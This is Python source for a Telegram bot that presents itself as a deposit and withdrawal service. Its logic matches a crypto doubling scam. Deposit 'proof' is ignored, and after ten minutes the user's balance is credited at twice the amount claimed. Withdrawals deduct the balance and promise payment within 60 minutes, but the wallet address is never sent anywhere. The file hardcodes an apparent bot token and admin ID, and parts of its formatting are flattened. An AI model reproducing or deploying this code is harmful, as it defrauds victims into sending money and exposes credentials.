import logging import sqlite3 import asyncio from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup from telegram.ext import ( ApplicationBuilder, CommandHandler, CallbackQueryHandler, ConversationHandler, MessageHandler, ContextTypes, filters )

TOKEN = "8047284110:AAGLIH-VVWRcTlwimcTQy0zimkiiBKY3vxo" ADMIN_ID = 6644712689

DEPOSIT_AMOUNT, DEPOSIT_PROOF, WITHDRAW_AMOUNT, WALLET_ADDRESS, SUPPORT_MESSAGE = range(5)

logging.basicConfig(level=logging.INFO)

conn = sqlite3.connect("users.db", check_same_thread=False) cursor = conn.cursor() cursor.execute(""" CREATE TABLE IF NOT EXISTS users ( id INTEGER PRIMARY KEY, username TEXT, balance REAL DEFAULT 0 ) """) conn.commit()

def get_or_create_user(user): cursor.execute("SELECT * FROM users WHERE id = ?", (user.id,)) data = cursor.fetchone() if not data: cursor.execute("INSERT INTO users (id, username, balance) VALUES (?, ?, 0)", (user.id, user.username or user.first_name)) conn.commit()

def update_balance(user_id, amount): cursor.execute("UPDATE users SET balance = balance + ? WHERE id = ?", (amount, user_id)) conn.commit()

def get_balance(user_id): cursor.execute("SELECT balance FROM users WHERE id = ?", (user_id,)) result = cursor.fetchone() return result[0] if result else 0

def main_menu(): return InlineKeyboardMarkup([ [ InlineKeyboardButton("Deposit", callback_data="deposit"), InlineKeyboardButton("Withdraw", callback_data="withdraw") ], [ InlineKeyboardButton("Balance", callback_data="balance"), InlineKeyboardButton("Support", callback_data="support") ] ])

def back_button(data="menu"): return InlineKeyboardMarkup([[InlineKeyboardButton("Back", callback_data=data)]])

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE): user = update.effective_user get_or_create_user(user) await update.message.reply_text("Welcome to the bot!", reply_markup=main_menu())

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE): query = update.callback_query user = query.from_user get_or_create_user(user) await query.answer()

if query.data == "menu":
    await query.message.edit_text("Main Menu:", reply_markup=main_menu())
elif query.data == "deposit":
    await query.message.edit_text("Enter the amount to deposit:", reply_markup=back_button())
    return DEPOSIT_AMOUNT
elif query.data == "withdraw":
    await query.message.edit_text("Enter the amount to withdraw:", reply_markup=back_button())
    return WITHDRAW_AMOUNT
elif query.data == "balance":
    balance = get_balance(user.id)
    await query.message.edit_text(f"Your balance is {balance:.2f} USD", reply_markup=back_button())
elif query.data == "support":
    await query.message.edit_text("Send your support message:", reply_markup=back_button())
    return SUPPORT_MESSAGE

async def deposit_amount(update: Update, context: ContextTypes.DEFAULT_TYPE): try: amount = float(update.message.text) if amount < 5: await update.message.reply_text("Minimum deposit is 5 USD.", reply_markup=main_menu()) return ConversationHandler.END context.user_data["deposit_amount"] = amount await update.message.reply_text("Send proof of transaction (text or photo):") return DEPOSIT_PROOF except ValueError: await update.message.reply_text("Invalid amount.", reply_markup=main_menu()) return ConversationHandler.END

async def deposit_proof(update: Update, context: ContextTypes.DEFAULT_TYPE): user = update.effective_user amount = context.user_data.get("deposit_amount") proof = update.message.text or (update.message.photo[-1].file_id if update.message.photo else "No proof") await update.message.reply_text("Your deposit is being processed. You'll be notified once it's confirmed.")

async def process_deposit():
    await asyncio.sleep(600)
    update_balance(user.id, amount * 2)
    await context.bot.send_message(user.id, f"Your deposit of {amount} USD has been confirmed. Your balance has been updated to {get_balance(user.id):.2f} USD.")

asyncio.create_task(process_deposit())
return ConversationHandler.END

async def withdraw_amount(update: Update, context: ContextTypes.DEFAULT_TYPE): try: amount = float(update.message.text) user = update.effective_user if amount > get_balance(user.id): await update.message.reply_text("You do not have enough balance.", reply_markup=main_menu()) return ConversationHandler.END context.user_data["withdraw_amount"] = amount await update.message.reply_text("Enter your wallet address:") return WALLET_ADDRESS except ValueError: await update.message.reply_text("Invalid amount.", reply_markup=main_menu()) return ConversationHandler.END

async def wallet_address(update: Update, context: ContextTypes.DEFAULT_TYPE): user = update.effective_user address = update.message.text amount = context.user_data["withdraw_amount"] cursor.execute("UPDATE users SET balance = balance - ? WHERE id = ?", (amount, user.id)) conn.commit() await update.message.reply_text("Your withdrawal request has been submitted and will be processed within 60 minutes.") return ConversationHandler.END

async def support_message(update: Update, context: ContextTypes.DEFAULT_TYPE): user = update.effective_user msg = update.message.text await context.bot.send_message(ADMIN_ID, f"Support message from {user.full_name} (@{user.username}):\n{msg}") await update.message.reply_text("Your message has been sent to support.") return ConversationHandler.END

def main(): app = ApplicationBuilder().token(TOKEN).build()

conv = ConversationHandler(
    entry_points=[CallbackQueryHandler(button_handler)],
    states={
        DEPOSIT_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, deposit_amount)],
        DEPOSIT_PROOF: [MessageHandler(filters.ALL, deposit_proof)],
        WITHDRAW_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, withdraw_amount)],
        WALLET_ADDRESS: [MessageHandler(filters.TEXT & ~filters.COMMAND, wallet_address)],
        SUPPORT_MESSAGE: [MessageHandler(filters.TEXT & ~filters.COMMAND, support_message)],
    },
    fallbacks=[],
)

app.add_handler(CommandHandler("start", start))
app.add_handler(conv)
app.add_handler(CallbackQueryHandler(button_handler))

app.run_polling()

if name == "main": main()

